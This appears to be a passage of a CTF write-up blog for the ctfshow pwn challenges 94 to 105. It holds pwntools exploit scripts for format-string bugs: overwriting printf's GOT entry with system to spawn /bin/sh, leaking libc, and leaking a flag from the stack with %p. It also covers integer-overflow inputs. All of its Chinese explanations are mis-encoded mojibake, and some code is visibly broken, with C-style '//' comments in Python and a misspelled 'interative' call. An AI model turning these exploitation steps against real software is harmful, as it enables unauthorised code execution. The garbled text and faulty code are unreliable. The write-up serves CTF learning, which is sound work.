<p>ÊãñËøõIDAÂèçÊ±áÁºñÔºåÂèëÁé∞ÊúâsysÂáΩÊï∞</p>
<p><img src="/p/ctfshow-pwn/image-20250303025027479.png"
	width="658"
	height="173"
	srcset="/p/ctfshow-pwn/image-20250303025027479_hu_8a8dec31e6fa8d.png 480w, /p/ctfshow-pwn/image-20250303025027479_hu_5ba06436f715c860.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="380"
		data-flex-basis="912px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./fmt&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28124</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,{</span><span class="n">printf_got</span><span class="p">:</span><span class="n">system_plt</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong><code>printf_got = elf.got['printf']</code></strong>:</p>
<ul>
<li>Ëé∑Âèñ<code>printf</code>ÂáΩÊï∞Âú®GOTÔºàGlobal Offset TableÔºâ‰∏≠ÁöÑÂú∞ÂùÄ„ÄÇGOTË°®Áî®‰∫éÂ≠òÂÇ®Âä®ÊÄÅÈìæÊé•ÂáΩÊï∞ÁöÑÂÆûÈôÖÂú∞ÂùÄ„ÄÇ</li>
</ul>
<p><strong><code>system_plt = elf.plt['system']</code></strong>:</p>
<ul>
<li>Ëé∑Âèñ<code>system</code>ÂáΩÊï∞Âú®PLTÔºàProcedure Linkage TableÔºâ‰∏≠ÁöÑÂú∞ÂùÄ„ÄÇPLTË°®Áî®‰∫éË∞ÉÁî®Âä®ÊÄÅÈìæÊé•ÁöÑÂáΩÊï∞„ÄÇ</li>
</ul>
<p><strong><code>payload = fmtstr_payload(offset, {printf_got: system_plt})</code></strong>:</p>
<ul>
<li>‰ΩøÁî®<code>pwntools</code>ÁöÑ<code>fmtstr_payload</code>ÂáΩÊï∞ÁîüÊàê‰∏Ä‰∏™Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÁöÑÂà©Áî®ËΩΩËç∑„ÄÇËøô‰∏™ËΩΩËç∑‰ºöÂ∞Ü<code>printf</code>ÂáΩÊï∞ÁöÑGOTË°®È°π‰øÆÊîπ‰∏∫<code>system</code>ÂáΩÊï∞ÁöÑÂú∞ÂùÄ„ÄÇ</li>
<li><code>offset</code>ÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÂÅèÁßªÈáè„ÄÇ</li>
<li><code>{printf_got: system_plt}</code>Ë°®Á§∫Â∞Ü<code>printf_got</code>Âú∞ÂùÄÂ§ÑÁöÑÂÄº‰øÆÊîπ‰∏∫<code>system_plt</code>„ÄÇ</li>
</ul>
<p><code>io.sendline('/bin/sh\x00')</code>**:</p>
<ul>
<li>ÂèëÈÄÅÂ≠óÁ¨¶‰∏≤<code>/bin/sh</code>ÁªôÁõÆÊ†áÁ®ãÂ∫è„ÄÇÁî±‰∫é<code>printf</code>ÁöÑGOTË°®È°πÂ∑≤ÁªèË¢´‰øÆÊîπ‰∏∫<code>system</code>ÔºåÂõ†Ê≠§ÂΩìÁ®ãÂ∫èË∞ÉÁî®<code>printf</code>Êó∂ÔºåÂÆûÈôÖ‰∏ä‰ºöË∞ÉÁî®<code>system('/bin/sh')</code>Ôºå‰ªéËÄåÂêØÂä®‰∏Ä‰∏™shell„ÄÇ</li>
</ul>
<h2 id="pwn95">pwn95
</h2><p>‰∏é‰∏ä‰∏ÄÈÅìÈ¢òÁõÆ‰∏ç‰∏ÄÊ†∑ÔºåÊ≤°Êúâ‰∫ÜsysÂáΩÊï∞ÔºåÈúÄË¶ÅÂéªÊ≥ÑÈú≤libcÔºåÁÑ∂ÂêéÂÜç‰øÆÊîπGOT</p>
<p>Ëá™Âä®Ê£ÄÊµãÂ≠óÁ¨¶‰∏≤ÂÅèÁßªÈáè</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">info</span>
</span></span><span class="line"><span class="cl"><span class="n">auto</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">exec_fmt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="n">auto</span><span class="o">.</span><span class="n">offset</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28291</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">info</span>
</span></span><span class="line"><span class="cl"><span class="n">auto</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">exec_fmt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="n">auto</span><span class="o">.</span><span class="n">offset</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;%{}$s&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">printf</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;system ===&gt; </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>    <span class="err">ÈÄöËøá</span><span class="n">printfÂáΩÊï∞ÁöÑÂÆûÈôÖÂú∞ÂùÄÂíålibcÂ∫ì‰∏≠ÁöÑÁ¨¶Âè∑ÂÅèÁßªÈáè</span><span class="err">ÔºåËÆ°ÁÆóÂá∫</span><span class="n">systemÂáΩÊï∞ÁöÑÂú∞ÂùÄ</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>        <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span><span class="err">ÔºöËÆ°ÁÆó</span><span class="n">libcÂ∫ìÁöÑÂü∫Âú∞ÂùÄ</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>      <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span><span class="err">ÔºöÂä†‰∏ä</span><span class="n">systemÂáΩÊï∞ÁöÑÂÅèÁßªÈáè</span><span class="err">ÔºåÂæóÂà∞</span><span class="n">systemÂáΩÊï∞ÁöÑÂÆûÈôÖÂú∞ÂùÄ</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>  <span class="err">‰ΩøÁî®</span><span class="nb">log</span><span class="o">.</span><span class="n">infoËæìÂá∫systemÂáΩÊï∞ÁöÑÂú∞ÂùÄ</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,{</span><span class="n">printf_got</span><span class="p">:</span><span class="n">system</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">‰ΩøÁî®</span><span class="n">pwntoolsÁöÑfmtstr_payloadÂáΩÊï∞ÁîüÊàê‰∏Ä‰∏™Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÁöÑÂà©Áî®ËΩΩËç∑</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span>   <span class="n">offset</span><span class="err">ÔºöÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÂÅèÁßªÈáè„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="o">//</span>  <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system</span><span class="p">}</span><span class="err">ÔºöÂ∞Ü</span><span class="n">printf_gotÂú∞ÂùÄÂ§ÑÁöÑÂÄº‰øÆÊîπ‰∏∫systemÂáΩÊï∞ÁöÑÂú∞ÂùÄ</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">ÂèëÈÄÅËΩΩËç∑ÔºåËß¶ÂèëÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºå‰øÆÊîπ</span><span class="n">printfÁöÑGOTË°®È°π‰∏∫systemÂáΩÊï∞ÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn96">pwn96
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> fgets(s, 64, stdin);//ËØªÂèñÁî®Êà∑ËæìÂÖ•ÔºåÊúÄÂ§ö64Â≠óËäÇ
</span></span><span class="line"><span class="cl"> printf(s);//Ëøô‰∏ÄË°åÁõ¥Êé•Â∞ÜÁî®Êà∑ÊéßÂà∂ÁöÑËæìÂÖ• s ‰Ωú‰∏∫ printf ÁöÑÊ†ºÂºèÂ≠óÁ¨¶‰∏≤„ÄÇËøôÊòØ‰∏Ä‰∏™ÁªèÂÖ∏ÁöÑÊ†ºÂºèÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û„ÄÇÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÂú®‰ªñ‰ª¨ÁöÑËæìÂÖ•‰∏≠Êèê‰æõÊ†ºÂºèËØ¥ÊòéÁ¨¶Ôºà‰æãÂ¶ÇÔºå %x „ÄÅ %s „ÄÅ %n ÔºâÊù•Âà©Áî®ÂÆÉÔºö
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏∫‰∫Ü‰øÆÂ§çËøô‰∏™ÊºèÊ¥ûÔºåÂú®Ë∞ÉÁî® <code>printf</code> Êó∂ÂßãÁªà‰ΩøÁî®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">printf(&#34;%s&#34;, s);
</span></span></code></pre></td></tr></table>
</div>
</div><p>ctfshow{&quot; ÂºÄÂ§¥,ËΩ¨Êç¢‰∏∫16ËøõÂà∂Â∞±ÊòØ 63 74 66 73 68</p>
<p>6f 77 7b</p>
<p>ÁÑ∂ÂêéÂÄíÂ∫èÂ∞±ÊòØ 0x73667463 0x7b776f68,</p>
<p><img src="/p/ctfshow-pwn/image-20250303171233254.png"
	width="1835"
	height="98"
	srcset="/p/ctfshow-pwn/image-20250303171233254_hu_43ecc0cd987bc7d2.png 480w, /p/ctfshow-pwn/image-20250303171233254_hu_3c93b6284ecea5a1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1872"
		data-flex-basis="4493px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">EXP</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;Ê≥ÑÈú≤Ê†à‰∏≠ÁöÑÂ≠óÁ¨¶‰∏≤&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28189</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="o">+</span><span class="mi">12</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="s1">&#39;%{}$p&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;$ &#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">aim</span> <span class="o">=</span> <span class="n">unhex</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="n">True</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="n">aim</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê≥®ÊÑèÊâÄÊúâÈÉ®ÂàÜÈÉΩÊòØÂ≠óËäÇÂØπË±°ÔºÅ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">%</span><span class="err">{}</span><span class="n">p</span><span class="o">`</span><span class="w"> </span><span class="err">‰∏≠ÁöÑ</span><span class="w"> </span><span class="o">`</span><span class="err">{}</span><span class="o">`</span><span class="w"> </span><span class="err">‰ºöË¢´ÊõøÊç¢‰∏∫ÂΩìÂâçÁöÑ</span><span class="w"> </span><span class="o">`</span><span class="n">i</span><span class="o">`</span><span class="w"> </span><span class="err">ÂÄºÔºå‰æãÂ¶Ç</span><span class="w"> </span><span class="o">`%</span><span class="mi">1</span><span class="n">p</span><span class="o">`</span><span class="err">„ÄÅ</span><span class="o">`%</span><span class="mi">2</span><span class="n">p</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="k">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="err">ÔºöÂéªÊéâËøîÂõûÊï∞ÊçÆ‰∏≠ÁöÑ</span><span class="w"> </span><span class="mi">0</span><span class="n">x</span><span class="w"> </span><span class="err">ÂâçÁºÄ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">unhex</span><span class="p">()</span><span class="err">Â∞ÜÂçÅÂÖ≠ËøõÂà∂ËΩ¨Êç¢ÊàêÂ≠óËäÇ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="s1">&#39;\n&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">drop</span><span class="o">=</span><span class="no">True</span><span class="p">)</span><span class="err">ÔºöÊé•Êî∂ÊúçÂä°Âô®ËøîÂõûÁöÑÊï∞ÊçÆÔºåÁõ¥Âà∞ÈÅáÂà∞Êç¢Ë°åÁ¨¶</span><span class="w"> </span><span class="err">\</span><span class="n">n</span><span class="err">ÔºåÂπ∂‰∏¢ÂºÉÊç¢Ë°åÁ¨¶„ÄÇ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">aim</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="err">ÈÄÜÂêë</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn101">pwn101
</h2><p><img src="/p/ctfshow-pwn/image-20250304194410992.png"
	width="1413"
	height="758"
	srcset="/p/ctfshow-pwn/image-20250304194410992_hu_8326fe6a8d9c876b.png 480w, /p/ctfshow-pwn/image-20250304194410992_hu_2b7a82578d0788ea.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="186"
		data-flex-basis="447px"
	
></p>
<p>v4Âíåv5ÂàùÂßãÂåñÔºåËæìÂÖ•‰∏§‰∏™Êï¥Êï∞ÔºåÊääÂÆÉËΩ¨Êç¢ÊàêÊó†Á¨¶Âè∑Êï¥Êï∞ÔºåÂπ∂ËµãÂÄºÁªôv4Âíåv5ÔºåÂ¶ÇÊûúv4=0x80000000,v5=0x7FFFFFFF,ÁªôflagÔºå‰ΩÜÊòØË¶ÅÊ±ÇËæìÂÖ•ÂçÅËøõÂà∂ÔºåÂø´Êç∑ÈîÆ‚ÄôH‚ÄòËΩ¨Êç¢Êï∞ÊçÆÁ±ªÂûã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28275</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;-2147483648 2147483647&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter two intergers:&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interative</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn102">pwn102
</h2><p><img src="/p/ctfshow-pwn/image-20250304195247199.png"
	width="714"
	height="424"
	srcset="/p/ctfshow-pwn/image-20250304195247199_hu_8133f68c12bfabe0.png 480w, /p/ctfshow-pwn/image-20250304195247199_hu_cb9583694edc0048.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="404px"
	
></p>
<p>Ë¶ÅÊ±ÇËæìÂÖ•Êó†Á¨¶Âè∑Êï¥ÂûãÔºåËæìÂÖ•4294967295Â∞±Ë°å</p>
<h2 id="pwn105">pwn105
</h2><p>Êï¥ÂΩ¢Ê∫¢Âá∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">408</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
</span></span><span class="line"><span class="cl">  <span class="ne">int</span> <span class="o">*</span><span class="n">p_argc</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">400</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
